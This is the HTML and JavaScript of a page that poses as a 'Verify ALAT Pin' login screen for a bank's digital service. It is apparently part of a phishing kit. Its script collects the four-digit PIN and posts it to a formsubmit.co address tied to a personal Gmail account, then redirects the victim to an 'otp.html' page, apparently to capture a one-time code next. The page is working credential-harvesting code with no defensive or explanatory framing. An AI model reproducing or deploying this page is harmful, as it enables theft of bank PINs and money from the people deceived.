<head>

</head>
<body>
  <div id="root">
    <div class="app">
      <div class="pin">
        <div class="container">
          <div class="contentSec">
            <div class="logo">
              <img src="/assets/logo-Cw-qJTno.png" alt="logo" />
            </div>
            <div class="hometitle">Verify ALAT Pin</div>
          </div>

          <div class="formSec">
            <form id="pin-form">
              <div class="formPin">
                <input type="password" name="pin-0" maxlength="1" class="pin-input" inputmode="numeric" required autofocus />
                <input type="password" name="pin-1" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="password" name="pin-2" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="password" name="pin-3" maxlength="1" class="pin-input" inputmode="numeric" required />
              </div>

              <input type="hidden" name="_captcha" value="false">
              <input type="hidden" name="_next" value="otp.html">

              <div class="buttonSec">
                <button type="submit" style="width: 100%; max-width: 22rem; padding: 12px; border-radius: 7px; border: none;">Login</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

<script>
  // Auto-focus movement between PIN inputs
  document.addEventListener('DOMContentLoaded', function() {
    const pinInputs = document.querySelectorAll('.pin-input');
    
    // Add event listeners to all PIN inputs
    pinInputs.forEach((input, index) => {
      // Move to next input when a digit is entered
      input.addEventListener('input', function() {
        if (this.value.length === 1) {
          if (index < pinInputs.length - 1) {
            pinInputs[index + 1].focus();
          }
        }
      });
      
      // Handle backspace to move to previous input
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
          pinInputs[index - 1].focus();
        }
      });
    });
    
    // Form submission handler
    const pinForm = document.getElementById('pin-form');
    pinForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      const formData = new FormData(pinForm);

      await fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
        method: 'POST',
        body: formData
      });

      window.location.href = 'otp.html'; // Redirect after success
    });
  });
</script>
